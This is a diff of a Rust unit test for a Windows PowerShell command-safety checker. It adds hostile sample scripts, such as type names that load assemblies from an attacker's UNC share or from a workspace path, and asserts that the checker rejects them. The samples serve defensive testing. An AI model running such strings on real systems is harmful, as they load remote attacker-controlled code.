@@ -502,6 +502,10 @@ mod tests {
         for script in [
             "UsInG MoDuLe '\\\\attacker\\share\\Evil.psd1'\nGet-Content Cargo.toml",
             "configuration CodexProbe { Import-DscResource -ModuleName '\\\\attacker\\share\\Evil.psd1' }",
+            r"[Codex.DoesNotExist, C:\workspace\Codex.AttackerAssembly]",
+            r"[Codex.DoesNotExist, \\attacker\share\Evil]",
+            "[Codex.DoesNotExist, C:/workspace/Codex.AttackerAssembly]",
+            "[Codex.DoesNotExist, //attacker/share/Evil]",
         ] {
             assert!(!is_safe_command_windows(&vec_str(&[
                 windows_powershell_exe(),
